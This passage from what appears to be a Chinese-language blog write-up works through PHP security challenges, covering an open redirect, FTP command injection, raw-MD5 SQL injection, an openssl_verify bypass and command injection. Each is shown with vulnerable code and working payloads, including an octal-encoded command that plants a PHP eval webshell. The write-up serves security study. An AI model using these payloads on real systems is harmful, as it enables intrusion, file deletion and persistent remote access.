class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pizza  = <span class="string">"piece1 piece2 piece3 piece4 piece5 piece6"</span>;</span><br><span class="line">$pieces = explode(<span class="string">" "</span>, $pizza);</span><br><span class="line"><span class="keyword">echo</span> $pieces[<span class="number">0</span>]; <span class="comment">// piece1</span></span><br><span class="line"><span class="keyword">echo</span> $pieces[<span class="number">1</span>]; <span class="comment">// piece2    </span></span><br><span class="line"></span><br><span class="line">end ( <span class="keyword">array</span> &amp;$array ) : mixed</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fruits = <span class="keyword">array</span>(<span class="string">'apple'</span>, <span class="string">'banana'</span>, <span class="string">'cranberry'</span>);</span><br><span class="line"><span class="keyword">echo</span> end($fruits); <span class="comment">// cranberry</span></span><br><span class="line"></span><br><span class="line">http_build_query ( mixed $query_data [, string $numeric_prefix [, string $arg_separator [, int $enc_type = PHP_QUERY_RFC1738 ]]] ) : string</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = <span class="keyword">array</span>(<span class="string">'foo'</span>=&gt;<span class="string">'bar'</span>,</span><br><span class="line">              <span class="string">'baz'</span>=&gt;<span class="string">'boom'</span>,</span><br><span class="line">              <span class="string">'cow'</span>=&gt;<span class="string">'milk'</span>,</span><br><span class="line">              <span class="string">'php'</span>=&gt;<span class="string">'hypertext processor'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> http_build_query($data) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// foo=bar&amp;baz=boom&amp;cow=milk&amp;php=hypertext+processor</span></span><br><span class="line"><span class="keyword">echo</span> http_build_query($data, <span class="string">''</span>, <span class="string">'&amp;amp;'</span>);    </span><br><span class="line"><span class="comment">// myvar_0=foo&amp;myvar_1=bar&amp;myvar_2=baz&amp;myvar_3=boom&amp;cow=milk&amp;php=hypertext+processor</span></span><br></pre></td></tr></table></figure><p>其本意应该是实现站内跳转，但是没有过滤，所以造成了漏洞。</p><p>此漏洞可被拿来构造钓鱼页面，来进行欺骗；某些依赖 <code>referer</code> 校验的安全解决方案也会失效。</p><p>例如，如果有提交本站 bug 的窗口，还可以结合一些 <code>xss</code> 盲打管理员 <code>cookie</code>。</p><h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/target.com?redirect=<span class="number">1</span>&amp;params[abc]=<span class="number">123</span></span><br><span class="line">URL --&gt; target.com?abc=<span class="number">123</span>  <span class="comment">// 仍然在站内跳转，需要添加一个 http://</span></span><br><span class="line">前面又是用 / 分割的，如果直接加入将失效，注意到 urldecode()，所以这里可用 url 二次编码绕过</span><br><span class="line"><span class="comment">//  --&gt;  %2f%2f  --&gt; %25%32%66%25%32%66</span></span><br><span class="line">最终 payload  --&gt; index.php/http:%<span class="number">252</span>f%<span class="number">252</span>fbaidu.com?redirect=<span class="number">1</span>&amp;params[abc]=<span class="number">123</span></span><br></pre></td></tr></table></figure><h2 id="16-Poem"><a href="#16-Poem" class="headerlink" title="16 - Poem"></a>16 - Poem</h2><blockquote><p>$_REQUESTS</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host, $port, $user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sock = fsockopen($host, $port);  <span class="comment">// 返回文件指针，文件操作相关函数都能用</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;login($user, $pass);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cleanInput();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mode($_REQUEST[<span class="string">'mode'</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;send($_FILES[<span class="string">'file'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $_GET = array_map(<span class="string">'intval'</span>, $_GET);</span><br><span class="line">        $_POST = array_map(<span class="string">'intval'</span>, $_POST);</span><br><span class="line">        $_COOKIE = array_map(<span class="string">'intval'</span>, $_COOKIE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"USER "</span> . $username . <span class="string">"\n"</span>);</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"PASS "</span> . $password . <span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mode</span><span class="params">($mode)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($mode == <span class="number">1</span> || $mode == <span class="number">2</span> || $mode == <span class="number">3</span>) &#123;</span><br><span class="line">            fputs(<span class="keyword">$this</span>-&gt;sock, <span class="string">"MODE $mode\n"</span>);  <span class="comment">// fputs 是 fwrite 别名</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        fputs(<span class="keyword">$this</span>-&gt;sock, $data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FTP(<span class="string">'localhost'</span>, <span class="number">21</span>, <span class="string">'user'</span>, <span class="string">'password'</span>);</span><br></pre></td></tr></table></figure><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>给的源码是一个 <code>FTP</code> 操作类，可能又是文件上传。</p><p>不熟悉 <code>fsockopen</code> 的，可以看看 <a href="http://www.manongjc.com/article/1463.html" target="_blank" rel="noopener">php fsockopen使用方法和实例讲解</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为数组每一个元素都应用回调函数，类似 map()</span></span><br><span class="line">array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>这用到了一个很有意思的超级全局变量—— <code>$_REQUEST</code>，开发过程中尽量不要用，我们先看下手册。</p><blockquote><p>默认情况下包含了 <a href="http://php.net/manual/zh/reserved.variables.get.php" target="_blank" rel="noopener">$_GET</a>，<a href="http://php.net/manual/zh/reserved.variables.post.php" target="_blank" rel="noopener">$_POST</a> 和 <a href="http://php.net/manual/zh/reserved.variables.cookies.php" target="_blank" rel="noopener">$_COOKIE</a> 的数组。</p><p>由于 $_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件，因此可以被远程用户篡改而并不可信。这个数组的项目及其顺序依赖于 PHP 的 <a href="http://php.net/manual/zh/ini.core.php#ini.variables-order" target="_blank" rel="noopener">variables_order</a> 指令的配置。</p></blockquote><p>为什么会说不可信呢？<code>$_REQUEST</code> 是直接从 <code>GET, POST, COOKIE</code> 中取值，而不是引用。也就是说，即使<code>GET, POST, COOKIE</code> 的值在后续发生了变化，也不会影响到 <code>$_REQUEST</code> 中的值，相当于复制了一份最初的值。</p><p>而上面的 <code>cleanInput()</code> 只是将 <code>GET, POST, COOKIE</code> 处理了一下，但是  <code>$_REQUEST</code> 依然不会受影响。</p><p><strong>做个小实验</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET = array_map(<span class="string">'intval'</span>, $_GET);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// ?hhh=123test 结果如下</span></span><br><span class="line">print_r($_GET);</span><br><span class="line">print_r($_REQUEST);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Array (</span></span><br><span class="line"><span class="comment">    [hhh] =&gt; 123</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">Array (</span></span><br><span class="line"><span class="comment">    [hhh] =&gt; 123test</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>还有一个小点，这里用的是 <code>==</code> ，会自动进行类型转换，所以轻松绕过，安全编码问题。</p><p><code>fwrite()</code> 能不能进行文件写入？<code>ftp</code> 协议还能进行哪些骚操作？</p><p>带着这两个问题再做做实验，不过这遇到了一个新问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fwrite ( resource $handle , string $string [, int $length ] ) : int</span><br><span class="line">fputs(<span class="keyword">$this</span>-&gt;sock, $data);  </span><br><span class="line"><span class="comment">// 传入的 $data 应该为 string 类型，但这里传的是数组，能行？</span></span><br><span class="line"><span class="comment">// 经过实验，传数组进去的后果就是什么也写不进去，感兴趣的同学可以自己试试。</span></span><br><span class="line"><span class="comment">// 所以传入的 $_FILES['file'] 本意是啥？</span></span><br><span class="line"><span class="comment">// 另外 ftp mode 有 1、2、3？</span></span><br></pre></td></tr></table></figure><p>先开启 <code>nc</code> 进行监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvvkp 8080</span><br></pre></td></tr></table></figure><p>上面的 <code>$_FILES[&#39;file&#39;]</code> 没多大意义，传不过去，所以表单也省了，直接在浏览器发起请求。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1bj3upo1vj20ms08t74v.jpg" alt></p><p>可以看到 <code>mode</code> 那成功绕过，但是绕过了又能干啥呢？</p><p>答案是任意 <code>ftp</code> 指令执行，只需要加个 <code>%0a</code> 换行和 <code>%0d</code> 回车即可实现命令（ftp）注入。</p><h3 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h3><p>我们先来看看 <code>ftp</code> 常用指令 <a href="https://blog.csdn.net/weiyuefei/article/details/51758288" target="_blank" rel="noopener">ftp协议指令集</a>  <a href="https://www.cnblogs.com/duanxz/p/5129153.html" target="_blank" rel="noopener">ftp协议详解</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">!               cr              macdef         <span class="built_in"> proxy </span>          send</span><br><span class="line">$               delete          mdelete         sendport        status</span><br><span class="line">account         <span class="builtin-name">debug</span>           mdir            put             struct</span><br><span class="line">append          dir             mget            pwd             sunique</span><br><span class="line">ascii           disconnect      mkdir           quit            tenex</span><br><span class="line">bell            form            mls             quote           trace</span><br><span class="line">binary          <span class="builtin-name">get</span>             mode            recv            type</span><br><span class="line">bye             glob            mput            remotehelp      user</span><br><span class="line">case            hash            nmap            rename          verbose</span><br><span class="line">cd              help            ntrans          reset           ?</span><br><span class="line">cdup           <span class="built_in"> lcd </span>            open            rmdir</span><br><span class="line">close           ls              prompt          runique</span><br></pre></td></tr></table></figure><p>可惜的是没有回显，不能进行下载了，其他的文件处理都能执行。</p><p>去看看官方 <code>wp</code> 对 <code>send()</code> 有何解释，没想到只是简单的讲了可以进行任意文件删除。</p><p>最终类似的 payload 为：<code>1%0a%0dDELETE%20test</code>，其中的 <code>DELETE</code> 可替换为其他指令。</p><h3 id="TODO-加-file-协议或许能上传文件。与-ftp-的主被动模式有关，待深研"><a href="#TODO-加-file-协议或许能上传文件。与-ftp-的主被动模式有关，待深研" class="headerlink" title="TODO: 加 file 协议或许能上传文件。与 ftp 的主被动模式有关，待深研"></a>TODO: 加 file 协议或许能上传文件。与 ftp 的主被动模式有关，待深研</h3><p>结合 gopher？FTP（不能实现上传下载文件，但是在有回显的情况下可用于爆破内网 FTP）</p><h2 id="17-Mistletoe"><a href="#17-Mistletoe" class="headerlink" title="17 - Mistletoe"></a>17 - Mistletoe</h2><blockquote><p>md5</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSecureLoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $em;</span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $pass = md5(<span class="keyword">$this</span>-&gt;password, <span class="keyword">true</span>);</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line"></span><br><span class="line">        $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">                        -&gt;select(<span class="string">"COUNT(p)"</span>)</span><br><span class="line">                        -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">                        -&gt;where(<span class="string">"password = '$pass' AND user = '$user'"</span>);</span><br><span class="line">        $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">        <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> addslashes($input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> RealSecureLoginManager(</span><br><span class="line">    $_POST[<span class="string">'user'</span>],</span><br><span class="line">    $_POST[<span class="string">'passwd'</span>]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>有 <code>sql</code> 语句，极有可能是注入题， <code>user</code> 被转义，注意到 <code>md5($this-&gt;passwd, true)</code> ，想起了一个 <a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">注入题</a>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5 ( string $str [, bool $raw_output = <span class="keyword">FALSE</span> ] ) : string</span><br><span class="line">raw 为 <span class="keyword">TRUE</span> 时为 <span class="number">16</span> 字符二进制格式，默认为 <span class="number">32</span> 字符十六进制数</span><br></pre></td></tr></table></figure><h3 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h3><blockquote><p>hint: “select * from admin where password=’”.md5($pass,true).”‘“</p><p>参考 <a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="noopener">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><p>​         <a href="http://www.am0s.com/functions/204.html" target="_blank" rel="noopener">http://www.am0s.com/functions/204.html</a></p><p>有个牛逼的字符串： ffifdyop，传入之后，最终的 sql 语句变为 </p><p>select * from admin where password=’’or’6�]��!r,��b’ 成功闭合，得到万能密码</p></blockquote><p>这还有一个有趣的数字——<code>128</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ php -r "var_dump(md5(128, true));"</span><br><span class="line">string(16) "v�an���l���q��\"</span><br></pre></td></tr></table></figure><p>可以看到末尾出现了一个 <code>\</code> ，将把 <code>‘</code> 吃掉，再结合一下 <code>user= or 1#</code></p><p>最终将形成这样的语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where password='v�an���l���q��\' AND user = ' or 1<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="18-Sign"><a href="#18-Sign" class="headerlink" title="18 - Sign"></a>18 - Sign</h2><blockquote><p>openssl_verify</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JWT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span><span class="params">($data, $signature)</span> </span>&#123;</span><br><span class="line">        $pub = openssl_pkey_get_public(<span class="string">"file://pub_key.pem"</span>);</span><br><span class="line">        $signature = base64_decode($signature);</span><br><span class="line">        <span class="keyword">if</span> (openssl_verify($data, $signature, $pub)) &#123;</span><br><span class="line">            $object = json_decode(base64_decode($data));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loginAsUser($object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> JWT())-&gt;verifyToken($_GET[<span class="string">'d'</span>], $_GET[<span class="string">'s'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>又是登录验证，先看一下这两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl_pkey_get_public ( mixed $certificate ) : resource</span><br><span class="line"><span class="comment">// 从 certificate 中解析公钥，供其他函数使用</span></span><br><span class="line">    </span><br><span class="line">openssl_verify ( string $data , string $signature , mixed $pub_key_id [, mixed $signature_alg = OPENSSL_ALGO_SHA1 ] ) : int</span><br><span class="line"><span class="comment">// 使用与 pub_key_id 关联的公钥验证指定数据 data 的签名 signature 是否正确</span></span><br></pre></td></tr></table></figure><p>一个好好的公钥验证函数会有什么漏洞呢？先看另一个很有意思的点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">1</span>) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'hhh&lt;br&gt;'</span>;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'jjj'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出结果：hhh jjj 都有</span></span><br><span class="line"><span class="comment">// 有人可能以为大于 0 才能过 if，然而非 0 即可</span></span><br></pre></td></tr></table></figure><p>手册上面的解释</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1btq7d85ej20nj0hxt9y.jpg" alt></p><p>再回到 <code>openssl_verify()</code> </p><blockquote><p>如果签名正确返回 1, 签名错误返回 0, 内部发生错误则返回-1</p></blockquote><p>所以这里只要构造出内部错误，自然就登录成功了。</p><h3 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h3><p>想让它出错也比较简单，只需用一个其他的 <code>pub_key.pem</code> 来生成 <code>data</code> 和 <code>signature</code>。</p><h2 id="19-Birch"><a href="#19-Birch" class="headerlink" title="19 - Birch"></a>19 - Birch</h2><blockquote><p>stripcslashes</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageViewer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">"images/$file"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createThumbnail();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createThumbnail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $e = stripcslashes(</span><br><span class="line">            preg_replace(</span><br><span class="line">                <span class="string">'/[^0-9\\\]/'</span>,</span><br><span class="line">                <span class="string">''</span>,</span><br><span class="line">                <span class="keyword">isset</span>($_GET[<span class="string">'size'</span>]) ? $_GET[<span class="string">'size'</span>] : <span class="string">'25'</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        system(<span class="string">"/usr/bin/convert $this-&gt;file --resize $e ./thumbs/$this-&gt;file"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;a href=$this-&gt;file&gt; &lt;img src=./thumbs/$this-&gt;file&gt;&lt;/a&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageViewer(<span class="string">"image.png"</span>));</span><br></pre></td></tr></table></figure><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>一个生成缩略图的类，<code>system()</code> 或许可以命令注入，<code>__toString()</code> 可能有 <code>xss</code>。</p><p>可惜 <code>file</code> 不可控，那我们仔细看看 <code>size</code> ，这有个特别的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stripcslashes ( string $str ) : string</span><br><span class="line"><span class="comment">// 返回反转义后的字符串。可识别类似 C 语言的 \n，\r，... 八进制以及十六进制的描述。</span></span><br></pre></td></tr></table></figure><p><code>/[^0-9\\\]/</code> 只能有数字、反斜杠和右中括号，上面那函数能识别十六进制，</p><p>但十六进制中包含字母，所以我们可以把字符串转成八进制试试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(stripcslashes(<span class="string">'\145\143\150\157\40\47\74\77\160\150\160\40\145\166\141\154\50\44\137\107\105\124\133\61\135\51\73\77\76\47\40\76\40\163\150\145\154\154\56\160\150\160'</span>));</span><br><span class="line"><span class="comment">// string(42) "echo '<span class="meta">&lt;?php</span> eval($_GET[1]);<span class="meta">?&gt;</span>' &gt; shell.php"</span></span><br><span class="line"><span class="comment">// 字符串直接转八进制不太好转，可以先转成URL，然后转成十进制，再转八进制</span></span><br></pre></td></tr></table></figure><p>另外，<code>system()</code> 里可以执行多条命令，用 <code>;</code> 分隔一下即可。</p><p>尝试写一个 <code>webshell</code> ，也可以直接反弹一个 <code>shell</code>。</p><p><code>stripcslashes()</code> 这难道不是多次一举，限制只能传入数字不就好了？为了兼容不同进制吗？</p><h3 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size=<span class="number">0</span>\<span class="number">073</span>\<span class="number">145</span>\<span class="number">143</span>\<span class="number">150</span>\<span class="number">157</span>\<span class="number">40</span>\<span class="number">47</span>\<span class="number">74</span>\<span class="number">77</span>\<span class="number">160</span>\<span class="number">150</span>\<span class="number">160</span>\<span class="number">40</span>\<span class="number">145</span>\<span class="number">166</span>\<span class="number">141</span>\<span class="number">154</span>\<span class="number">50</span>\<span class="number">44</span>\<span class="number">137</span>\<span class="number">107</span>\<span class="number">105</span>\<span class="number">124</span>\<span class="number">133</span>\<span class="number">61</span>\<span class="number">135</span>\<span class="number">51</span>\<span class="number">73</span>\<span class="number">77</span>\<span class="number">76</span>\<span class="number">47</span>\<span class="number">40</span>\<span class="number">76</span>\<span class="number">40</span>\<span class="number">163</span>\<span class="number">150</span>\<span class="number">145</span>\<span class="number">154</span>\<span class="number">154</span>\<span class="number">56</span>\<span class="number">160</span>\<span class="number">150</span>\<span class="number">160</span>\<span class="number">073</span></span><br></pre></td></tr></table></figure><p>最终执行的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/convert images/image.png --resize 0;echo '&lt;?php eval($_GET[1]);?&gt;' &gt; shell.php;</span><br></pre></td></tr></table></figure><p>写入成功</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1bxcudmt2j20r30fc0u1.jpg" alt></p><h2 id="20-Stocking"><a href="#20-Stocking" class="headerlink" title="20 - Stocking"></a>20 - Stocking</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span> <span class="params">($no, $str, $file, $line)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ErrorException($str, <span class="number">0</span>, $no, $file, $line);</span><br><span class="line">&#125;, E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageLoader</span> </span>&#123;</span><br><span 